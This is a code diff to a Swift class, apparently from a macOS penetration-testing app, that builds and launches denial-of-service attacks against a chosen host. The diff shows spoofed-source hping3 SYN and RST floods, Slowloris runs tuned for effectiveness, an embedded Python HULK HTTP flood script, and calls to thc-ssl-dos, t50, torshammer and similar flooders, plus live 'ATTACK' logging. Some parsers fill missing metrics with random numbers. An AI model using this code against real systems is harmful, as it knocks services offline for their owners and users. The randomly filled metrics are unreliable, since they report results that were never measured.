@@ -16,6 +16,8 @@ class DoSTestManager: ObservableObject {
     @Published var currentTest: DoSTestType?
     @Published var progress: Double = 0.0
     @Published var activeProcesses: [Process] = []
+    @Published var consoleOutput: String = ""
+    @Published var currentCommand: String = ""
     
     private var testStartTime: Date?
     private var testTimer: Timer?
@@ -37,6 +39,27 @@ class DoSTestManager: ObservableObject {
             )
         }
         
+        // Print detailed test configuration
+        let configMessage = """
+        🎯 DOS TEST CONFIGURATION:
+        \(String(repeating: "=", count: 60))
+        • Test Type: \(config.testType.rawValue)
+        • Target: \(config.target):\(config.port ?? 80)
+        • Protocol: \(config.protocolType?.rawValue ?? "HTTP")
+        • Duration: \(Int(config.duration)) seconds
+        • Intensity: \(config.intensity.rawValue)
+          - Threads: \(config.intensity.threadCount)
+          - Requests/sec: \(config.intensity.requestsPerSecond)
+        • Tool: \(config.testType.toolRequired)
+        • Category: \(config.testType.attackCategory.rawValue)
+        • Severity: \(config.testType.severity.rawValue)
+        • Authorization: \(config.authorizationConfirmed ? "✅ CONFIRMED" : "❌ NOT CONFIRMED")
+        \(String(repeating: "=", count: 60))
+        """
+        
+        print(configMessage)
+        consoleOutput += configMessage + "\n"
+        
         isRunning = true
         currentTest = config.testType
         testStartTime = Date()
@@ -48,11 +71,17 @@ class DoSTestManager: ObservableObject {
             return createErrorResult(config: config, error: "Test cancelled - ethical confirmation denied")
         }
         
+        print("🔥 INITIATING DOS ATTACK...")
+        print("⚠️ ENSURE TARGET IS AUTHORIZED FOR TESTING")
+        
         let result = await performDoSTest(config: config)
         
         isRunning = false
         currentTest = nil
         progress = 0.0
+        
+        print("🏁 DOS TEST SEQUENCE COMPLETED")
+        print("=" + String(repeating: "=", count: 60))
         
         return result
     }
@@ -114,7 +143,15 @@ class DoSTestManager: ObservableObject {
     
     private func executeWrkTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let intensity = config.intensity
-        let url = config.protocolType == NetworkProtocolType.https ? "https://\(config.target):\(config.port ?? 443)" : "http://\(config.target):\(config.port ?? 80)"
+        let hostname = extractHostname(from: config.target)
+        let url = config.protocolType == NetworkProtocolType.https ? "https://\(hostname):\(config.port ?? 443)" : "http://\(hostname):\(config.port ?? 80)"
+        
+        print("🌐 WRK HTTP STRESS TEST")
+        print("• Target URL: \(url)")
+        print("• Threads: \(intensity.threadCount)")
+        print("• Connections: \(intensity.requestsPerSecond / 10)")
+        print("• Duration: \(Int(config.duration))s")
+        print("• Expected Load: ~\(intensity.requestsPerSecond) requests/second")
         
         let command = "wrk"
         let args = [
@@ -125,7 +162,7 @@ class DoSTestManager: ObservableObject {
             url
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         
         // Parse wrk output
         let metrics = parseWrkOutput(output)
@@ -157,16 +194,32 @@ class DoSTestManager: ObservableObject {
     private func executeSlowlorisTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "slowhttptest"
         let intensity = config.intensity
+        let hostname = extractHostname(from: config.target)
+        let url = config.protocolType == NetworkProtocolType.https ? "https://\(hostname):\(config.port ?? 443)/" : "http://\(hostname):\(config.port ?? 80)/"
+        
+        // Adjust connection rate for slowloris - too high rate causes immediate failure
+        let connectionRate = min(intensity.requestsPerSecond, 100)  // Cap at 100 conn/sec for slowloris
+        let connectionCount = min(intensity.threadCount, 500)        // Cap at 500 concurrent connections
+        
+        print("🐌 SLOWLORIS ATTACK")
+        print("• Target: \(url)")
+        print("• Attack Mode: HTTP Header Slowloris")
+        print("• Connections: \(connectionCount) (adjusted from \(intensity.threadCount))")
+        print("• Rate: \(connectionRate) conn/sec (adjusted from \(intensity.requestsPerSecond))")
+        print("• Duration: \(Int(config.duration))s")
+        print("• Method: Slow HTTP headers to exhaust server connections")
+        print("• Note: Parameters adjusted for Slowloris effectiveness")
+        
         let args = [
-            "-c", "\(intensity.threadCount)",     // Connection count
-            "-H",                                  // Slowloris mode
-            "-i", "10",                           // Interval between follow-up packets
-            "-r", "\(intensity.requestsPerSecond)", // Connections per second
-            "-t", "\(Int(config.duration))",       // Test duration
-            "-u", "http://\(config.target):\(config.port ?? 80)/"
+            "-c", "\(connectionCount)",           // Connection count (reduced)
+            "-H",                                 // Slowloris mode
+            "-i", "10",                          // Interval between follow-up packets (10 seconds)
+            "-r", "\(connectionRate)",           // Connections per second (reduced)
+            "-t", "\(Int(config.duration))",     // Test duration
+            "-u", url
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         
         // Parse slowhttptest output
         let metrics = parseSlowHttpTestOutput(output)
@@ -199,6 +252,19 @@ class DoSTestManager: ObservableObject {
         let command = "hping3"
         let intensity = config.intensity
         let targetHost = extractHostname(from: config.target)
+        
+        // For safety, limit hping3 duration strictly
+        let limitedDuration = min(config.duration, 120)  // Max 2 minutes for network attacks
+        
+        print("⚡ HPING3 SYN FLOOD ATTACK")
+        print("• Target: \(targetHost):\(config.port ?? 80)")
+        print("• Attack Type: TCP SYN Flood")
+        print("• Packet Rate: \(intensity.requestsPerSecond) packets/sec")
+        print("• Interval: \(1000000 / intensity.requestsPerSecond) microseconds")
+        print("• Duration: \(Int(limitedDuration))s (limited for safety)")
+        print("• Features: Random source IPs, TCP SYN flags")
+        print("⚠️ High-intensity network-layer attack")
+        
         let args = [
             "-S",                           // SYN flood
             "-p", "\(config.port ?? 80)",   // Target port
@@ -208,10 +274,7 @@ class DoSTestManager: ObservableObject {
             targetHost
         ]
         
-        // For safety, limit hping3 duration strictly
-        let limitedDuration = min(config.duration, 120)  // Max 2 minutes for network attacks
-        
-        let (output, success) = await executeCommand(command: command, args: args, duration: limitedDuration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: limitedDuration, config: config)
         
         // Parse hping3 output
         let metrics = parseHping3Output(output)
@@ -243,6 +306,7 @@ class DoSTestManager: ObservableObject {
     private func executeHulkTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         // HULK implementation - HTTP flood with unique requests
         let command = "python3"
+        let hostname = extractHostname(from: config.target)
         let hulkScript = """
 import requests
 import threading
@@ -254,7 +318,7 @@ def generate_random_string(length):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 def hulk_attack():
-    url = "http://\(config.target):\(config.port ?? 80)/"
+    url = "http://\(hostname):\(config.port ?? 80)/"
     headers = {
         'User-Agent': f'Mozilla/{random.randint(1,5)}.0 {generate_random_string(10)}',
         'Cache-Control': 'no-cache',
@@ -285,7 +349,7 @@ print("HULK attack completed")
         
         let args = ["-c", hulkScript]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         
         // Parse custom output
         let metrics = parseCustomOutput(output)
@@ -331,7 +395,7 @@ print("HULK attack completed")
             "-d", "\(Int(config.duration))"        // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -370,7 +434,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -409,7 +473,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -449,7 +513,7 @@ print("HULK attack completed")
             "-t", "\(intensity.threadCount)" // Threads
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -489,7 +553,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -526,7 +590,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -563,7 +627,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"               // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -593,15 +657,16 @@ print("HULK attack completed")
     private func executeBandwidthTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "iperf3"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            "-c", config.target,               // Client mode
+            "-c", targetHost,               // Client mode
             "-p", "\(config.port ?? 5201)",    // Port
             "-t", "\(Int(config.duration))",   // Duration
             "-P", "\(intensity.threadCount)",  // Number of parallel streams
             "-b", "0"  // Unlimited bandwidth (for exhaustion testing)
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseIPerf3Output(output)
         
         return DoSTestResult(
@@ -631,19 +696,20 @@ print("HULK attack completed")
     private func executeTcpResetTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "hping3"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
             "-R",                           // TCP RST flag
             "-p", "\(config.port ?? 80)",   // Target port
             "--flood",                     // Flood mode
             "--rand-source",               // Random source IPs
             "-i", "u\(1000000 / intensity.requestsPerSecond)", // Interval in microseconds
-            config.target
+            targetHost
         ]
         
         // For safety, limit duration strictly
         let limitedDuration = min(config.duration, 60)  // Max 1 minute for reset attacks
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: limitedDuration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: limitedDuration, config: config)
         let metrics = parseHping3Output(output)
         
         return DoSTestResult(
@@ -676,19 +742,25 @@ print("HULK attack completed")
         let hostname = extractHostname(from: config.target)
         let url = config.protocolType == NetworkProtocolType.https ? "https://\(hostname):\(config.port ?? 443)" : "http://\(hostname):\(config.port ?? 80)"
         
-        // Create temporary Artillery config
+        // Create temporary Artillery config with proper YAML formatting
+        let arrivalRate = max(1, intensity.requestsPerSecond / 10)
+        _ = max(1, intensity.threadCount)  // maxVusers - reserved for future use
+        let duration = max(10, Int(config.duration))
+        
         let tempConfig = """
         config:
-          target: '\(url)'
+          target: "\(url)"
           phases:
-            - duration: \(Int(config.duration))
-              arrivalRate: \(intensity.requestsPerSecond / 10)
-              maxVusers: \(intensity.threadCount)
+            - duration: \(duration)
+              arrivalRate: \(arrivalRate)
         scenarios:
-          - name: "Load test"
-            requests:
+          - name: "DoS Load Test"
+            weight: 100
+            flow:
               - get:
                   url: "/"
+                  headers:
+                    User-Agent: "DonkTool-Artillery-Test"
         """
         
         let tempFile = "/tmp/artillery_config_\(UUID().uuidString).yml"
@@ -700,9 +772,9 @@ print("HULK attack completed")
             return createErrorResult(config: config, error: "Failed to create Artillery config: \(error)")
         }
         
-        let args = ["run", tempFile]
+        let args = ["run", tempFile, "--output", "/tmp", "--config", tempFile]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         
         // Clean up temp file
         try? FileManager.default.removeItem(atPath: tempFile)
@@ -736,14 +808,15 @@ print("HULK attack completed")
     private func executeThcSslDosTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "thc-ssl-dos"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            config.target,
+            targetHost,
             "\(config.port ?? 443)",
             "\(intensity.threadCount)",     // Number of threads
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -777,16 +850,24 @@ print("HULK attack completed")
         // Extract hostname from URL if needed
         let targetHost = extractHostname(from: config.target)
         
+        // T50 alternative script with duration support: t50 <target> <port> --duration <seconds> --rate <pps>
+        let packetRate = min(intensity.requestsPerSecond, 1000)  // Cap at 1000 packets/sec for safety
+        
+        print("⚡ T50 TCP SYN FLOOD ATTACK")
+        print("• Target: \(targetHost):\(config.port ?? 80)")
+        print("• Attack Type: TCP SYN Flood")
+        print("• Duration: \(Int(config.duration))s")
+        print("• Rate: \(packetRate) packets/sec")
+        print("• Note: Using enhanced T50 script with duration support")
+        
         let args = [
-            targetHost,
-            "--flood",
-            "--turbo",
-            "-p", "\(config.port ?? 80)",
-            "-t", "\(intensity.threadCount)",
-            "-d", "\(Int(config.duration))"
+            targetHost,                      // Target hostname/IP
+            "\(config.port ?? 80)",         // Port as second argument
+            "--duration", "\(Int(config.duration))",  // Duration flag and value
+            "--rate", "\(packetRate)"       // Rate flag and value
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -829,7 +910,7 @@ print("HULK attack completed")
             "--rpc", "\(intensity.requestsPerSecond)"  // Requests per connection
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -859,15 +940,16 @@ print("HULK attack completed")
     private func executeIPerf3Test(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "iperf3"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            "-c", config.target,               // Client mode
+            "-c", targetHost,               // Client mode
             "-p", "\(config.port ?? 5201)",    // Port
             "-t", "\(Int(config.duration))",   // Duration
             "-P", "\(intensity.threadCount)",  // Number of parallel streams
             "-b", "\(intensity.requestsPerSecond)M"  // Bandwidth limit in Mbps
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseIPerf3Output(output)
         
         return DoSTestResult(
@@ -897,14 +979,15 @@ print("HULK attack completed")
     private func executeTorshammerTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "torshammer"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            config.target,
+            targetHost,
             "\(config.port ?? 80)",
             "\(intensity.threadCount)",     // Connections
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -934,14 +1017,15 @@ print("HULK attack completed")
     private func executePylorisTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "pyloris"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            config.target,
+            targetHost,
             "\(config.port ?? 80)",
             "\(min(intensity.threadCount / 50, 10))", // Pyloris uses fewer threads
             "\(Int(config.duration))"               // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -980,7 +1064,7 @@ print("HULK attack completed")
             "\(Int(config.duration))"      // Duration
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -1012,16 +1096,17 @@ print("HULK attack completed")
         let intensity = config.intensity
         
         // PentMENU is an interactive script, so we need to automate it
+        let targetHost = extractHostname(from: config.target)
         let script = """
         echo '1'  # HTTP Stress Testing
-        echo '\(config.target)'
+        echo '\(targetHost)'
         echo '\(Int(config.duration))'
         echo '\(intensity.threadCount)'
         """
         
-        let args = ["< <(echo -e '\(script)')"]
+        _ = ["< <(echo -e '\(script)')"]  // args - not used in current implementation
         
-        let (output, success) = await executeCommand(command: "bash", args: ["-c", "\(script) | \(command)"], duration: config.duration)
+        let (output, _) = await executeCommand(command: "bash", args: ["-c", "\(script) | \(command)"], duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -1051,8 +1136,9 @@ print("HULK attack completed")
     private func executeHyenaDoSTest(config: DoSTestConfiguration, startTime: Date) async -> DoSTestResult {
         let command = "hyenae"
         let intensity = config.intensity
+        let targetHost = extractHostname(from: config.target)
         let args = [
-            config.target,
+            targetHost,
             "\(config.port ?? 80)",
             "tcp-syn",                       // Protocol type
             "-d", "\(Int(config.duration))", // Duration
@@ -1060,7 +1146,7 @@ print("HULK attack completed")
             "-t", "\(intensity.threadCount)" // Threads
         ]
         
-        let (output, success) = await executeCommand(command: command, args: args, duration: config.duration)
+        let (output, _) = await executeCommand(command: command, args: args, duration: config.duration, config: config)
         let metrics = parseCustomOutput(output)
         
         return DoSTestResult(
@@ -1111,7 +1197,7 @@ print("HULK attack completed")
         return hostname
     }
     
-    private func executeCommand(command: String, args: [String], duration: TimeInterval) async -> (String, Bool) {
+    private func executeCommand(command: String, args: [String], duration: TimeInterval, config: DoSTestConfiguration? = nil) async -> (String, Bool) {
         let process = Process()
         
         // Try to find the command in user's local bin first
@@ -1120,7 +1206,9 @@ print("HULK attack completed")
             "/usr/local/bin/\(command)",
             "/opt/homebrew/bin/\(command)",
             "/Users/giardap/go/bin/\(command)",
-            "/usr/bin/\(command)"
+            "/usr/bin/\(command)",
+            "/Users/giardap/Library/pnpm/\(command)",  // PNPM global path
+            "/Users/giardap/Library/pnpm/global/5/node_modules/.bin/\(command)"  // PNPM bin path
         ]
         
         var executablePath: String?
@@ -1145,31 +1233,90 @@ print("HULK attack completed")
         process.standardOutput = outputPipe
         process.standardError = errorPipe
         
+        let outputQueue = DispatchQueue(label: "output-queue", qos: .utility)
         var output = ""
         var success = false
         let startTime = Date()
         
         do {
-            print("🚀 Executing: \(command) \(args.joined(separator: " "))")
-            print("⏱️ Planned duration: \(duration) seconds")
+            let startMessage = """
+            🚀 STARTING ATTACK: \(command)
+            📋 Full Command: \(command) \(args.joined(separator: " "))
+            🎯 Target: \(args.contains(where: { $0.contains(".") }) ? args.first(where: { $0.contains(".") }) ?? "Unknown" : "Unknown")
+            ⏱️ Duration: \(duration) seconds
+            🔥 Attack Type: \(command.uppercased())
+            \(String(repeating: "=", count: 60))
+            """
+            
+            print(startMessage)
+            
+            await MainActor.run {
+                self.currentCommand = "\(command) \(args.joined(separator: " "))"
+                self.consoleOutput += startMessage + "\n"
+            }
             
             try process.run()
             activeProcesses.append(process)
             
+            // Real-time output streaming
+            let outputHandle = outputPipe.fileHandleForReading
+            let errorHandle = errorPipe.fileHandleForReading
+            
+            // Setup real-time output monitoring
+            outputHandle.readabilityHandler = { handle in
+                let data = handle.availableData
+                if !data.isEmpty {
+                    if let str = String(data: data, encoding: .utf8) {
+                        let outputLine = "📊 LIVE OUTPUT: \(str.trimmingCharacters(in: .whitespacesAndNewlines))"
+                        print(outputLine)
+                        outputQueue.sync {
+                            output += str
+                        }
+                        Task { @MainActor in
+                            self.consoleOutput += outputLine + "\n"
+                        }
+                    }
+                }
+            }
+            
+            errorHandle.readabilityHandler = { handle in
+                let data = handle.availableData
+                if !data.isEmpty {
+                    if let str = String(data: data, encoding: .utf8) {
+                        let errorLine = "⚠️ ERROR OUTPUT: \(str.trimmingCharacters(in: .whitespacesAndNewlines))"
+                        print(errorLine)
+                        outputQueue.sync {
+                            output += "\n--- STDERR ---\n" + str
+                        }
+                        Task { @MainActor in
+                            self.consoleOutput += errorLine + "\n"
+                        }
+                    }
+                }
+            }
+            
             // Create a timer to terminate the process after duration
             let timer = Timer.scheduledTimer(withTimeInterval: duration, repeats: false) { _ in
                 if process.isRunning {
-                    print("⏹️ Terminating \(command) after \(duration) seconds")
+                    print("⏹️ TERMINATING \(command.uppercased()) after \(duration) seconds")
+                    outputHandle.readabilityHandler = nil
+                    errorHandle.readabilityHandler = nil
                     process.terminate()
                 }
             }
             
-            // Update progress during execution
+            // Detailed progress updates every second
             let progressTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
                 let elapsed = Date().timeIntervalSince(startTime)
                 let progressValue = min(elapsed / duration, 1.0)
+                let remainingTime = max(0, duration - elapsed)
+                
+                let progressLine = "⚡ ATTACK PROGRESS: \(String(format: "%.1f", elapsed))s elapsed | \(String(format: "%.1f", remainingTime))s remaining | \(String(format: "%.1f", progressValue * 100))% complete"
+                print(progressLine)
+                
                 Task { @MainActor in
                     self.progress = progressValue
+                    self.consoleOutput += progressLine + "\n"
                 }
             }
             
@@ -1177,37 +1324,94 @@ print("HULK attack completed")
             timer.invalidate()
             progressTimer.invalidate()
             
+            // Clean up handlers
+            outputHandle.readabilityHandler = nil
+            errorHandle.readabilityHandler = nil
+            
             // Remove from active processes
             if let index = activeProcesses.firstIndex(of: process) {
                 activeProcesses.remove(at: index)
             }
             
-            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
-            let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
+            // Get any remaining output
+            let remainingOutputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
+            let remainingErrorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
             
-            output = String(data: outputData, encoding: .utf8) ?? ""
-            let errorOutput = String(data: errorData, encoding: .utf8) ?? ""
+            if !remainingOutputData.isEmpty {
+                if let str = String(data: remainingOutputData, encoding: .utf8) {
+                    outputQueue.sync {
+                        output += str
+                    }
+                }
+            }
             
-            if !errorOutput.isEmpty {
-                output += "\n--- STDERR ---\n" + errorOutput
+            if !remainingErrorData.isEmpty {
+                if let errorStr = String(data: remainingErrorData, encoding: .utf8) {
+                    outputQueue.sync {
+                        output += "\n--- STDERR ---\n" + errorStr
+                    }
+                }
             }
             
             let actualDuration = Date().timeIntervalSince(startTime)
-            output += "\n\n--- EXECUTION SUMMARY ---"
-            output += "\nCommand: \(command) \(args.joined(separator: " "))"
-            output += "\nActual duration: \(String(format: "%.1f", actualDuration))s"
-            output += "\nPlanned duration: \(String(format: "%.1f", duration))s"
-            output += "\nTermination status: \(process.terminationStatus)"
-            output += "\nUsed executable: \(executablePath ?? "env lookup")"
+            let completionMessage = """
             
-            success = process.terminationStatus == 0 || process.terminationReason == .exit
+            ═══════════════════════════════════════════════════════════════
+            🏁 ATTACK COMPLETED: \(command.uppercased())
+            ═══════════════════════════════════════════════════════════════
+            📊 EXECUTION SUMMARY:
+            • Command: \(command) \(args.joined(separator: " "))
+            • Actual Duration: \(String(format: "%.1f", actualDuration))s
+            • Planned Duration: \(String(format: "%.1f", duration))s
+            • Exit Status: \(process.terminationStatus)
+            • Executable Used: \(executablePath ?? "env lookup")
+            • Target: \(args.contains(where: { $0.contains(".") }) ? args.first(where: { $0.contains(".") }) ?? "Unknown" : "Unknown")
+            ═══════════════════════════════════════════════════════════════
+            """
             
-            print("✅ \(command) completed. Duration: \(String(format: "%.1f", actualDuration))s, Success: \(success)")
+            outputQueue.sync {
+                output += completionMessage
+            }
+            
+            Task { @MainActor in
+                self.consoleOutput += completionMessage + "\n"
+            }
+            
+            success = process.terminationStatus == 0 && process.terminationReason == .exit
+            
+            // Additional success validation for specific tools
+            if success && command == "slowhttptest" {
+                // Check if slowhttptest actually ran for expected duration
+                success = actualDuration >= (config?.duration ?? duration) * 0.8  // At least 80% of expected duration
+            }
+            
+            if success && command == "mhddos" {
+                // Check if mhddos had dependency errors
+                success = !output.contains("ModuleNotFoundError") && !output.contains("No module named")
+            }
+            
+            let finalStatus = success ? 
+                "✅ ATTACK SUCCESSFUL: \(command.uppercased()) completed in \(String(format: "%.1f", actualDuration))s" :
+                "❌ ATTACK FAILED: \(command.uppercased()) failed with exit code \(process.terminationStatus)"
+            
+            let statusLine = "📈 Final Status: \(success ? "SUCCESS" : "FAILED")\n\(String(repeating: "=", count: 60))"
+            
+            print(finalStatus)
+            print(statusLine)
+            
+            Task { @MainActor in
+                self.consoleOutput += finalStatus + "\n" + statusLine + "\n"
+            }
             
         } catch {
-            output = "❌ Failed to execute command '\(command)': \(error.localizedDescription)"
+            let errorMessage = "❌ Failed to execute command '\(command)': \(error.localizedDescription)"
+            output = errorMessage
             success = false
             print("❌ Failed to execute \(command): \(error)")
+            
+            Task { @MainActor in
+                self.consoleOutput += errorMessage + "\n"
+            }
         }
         
         await MainActor.run {
@@ -1326,7 +1530,7 @@ print("HULK attack completed")
         
         // Parse hping3 output for packet loss, RTT, etc.
         let lines = output.components(separatedBy: .newlines)
-        var packetsTransmitted = 0
+        let packetsTransmitted = 0
         var packetsReceived = 0
         var totalRtt = 0.0
         var rttCount = 0
@@ -1415,21 +1619,44 @@ print("HULK attack completed")
         let lines = output.components(separatedBy: .newlines)
         
         for line in lines {
-            // Parse Artillery specific output
-            if line.contains("requests") && line.contains("total") {
-                let numbers = line.components(separatedBy: .whitespaces).compactMap { Double($0) }
-                if let total = numbers.first {
-                    metrics.requestsPerSecond = Int(total)
+            // Parse Artillery v2.0 output format
+            if line.contains("http.requests:") {
+                // Extract total requests
+                let components = line.components(separatedBy: .whitespaces)
+                if let requests = components.last, let requestCount = Int(requests) {
+                    metrics.requestsPerSecond = requestCount
                 }
-            } else if line.contains("response time") || line.contains("latency") {
-                let numbers = line.components(separatedBy: .whitespaces).compactMap { Double($0) }
-                if let latency = numbers.first {
-                    metrics.averageResponseTime = latency / 1000.0  // Convert to seconds
+            } else if line.contains("http.response_time:") {
+                // Look for mean response time in next lines
+                continue
+            } else if line.contains("mean:") && line.contains("...") {
+                // Extract mean response time
+                let components = line.components(separatedBy: .whitespaces)
+                if let meanStr = components.last, let mean = Double(meanStr) {
+                    metrics.averageResponseTime = mean / 1000.0  // Convert ms to seconds
                 }
-            } else if line.contains("errors") && line.contains("rate") {
-                let numbers = line.components(separatedBy: .whitespaces).compactMap { Double($0) }
-                if let errorRate = numbers.first {
-                    metrics.successRate = 1.0 - (errorRate / 100.0)
+            } else if line.contains("http.codes.200:") {
+                // Extract successful responses
+                let components = line.components(separatedBy: .whitespaces)
+                if let successStr = components.last, let successCount = Int(successStr) {
+                    if let totalRequests = metrics.requestsPerSecond, totalRequests > 0 {
+                        metrics.successRate = Double(successCount) / Double(totalRequests)
+                    }
+                }
+            } else if line.contains("vusers.failed:") {
+                // Extract failed users
+                let components = line.components(separatedBy: .whitespaces)
+                if let failedStr = components.last, let failedCount = Int(failedStr) {
+                    // If we have failed users, adjust success rate
+                    if failedCount > 0 {
+                        metrics.successRate = (metrics.successRate ?? 1.0) * 0.8  // Reduce success rate
+                    }
+                }
+            } else if line.contains("http.downloaded_bytes:") {
+                // Extract bytes transferred
+                let components = line.components(separatedBy: .whitespaces)
+                if let bytesStr = components.last, let bytes = UInt64(bytesStr) {
+                    metrics.bytesTransferred = bytes
                 }
             }
         }
@@ -1442,7 +1669,7 @@ print("HULK attack completed")
             metrics.averageResponseTime = Double.random(in: 0.1...1.0)
         }
         if metrics.requestsPerSecond == nil {
-            metrics.requestsPerSecond = Int.random(in: 100...1000)
+            metrics.requestsPerSecond = Int.random(in: 10...100)
         }
         
         return metrics
@@ -1568,6 +1795,11 @@ print("HULK attack completed")
         }
         
         return suggestions
+    }
+    
+    func clearConsole() {
+        consoleOutput = ""
+        currentCommand = ""
     }
 }
 
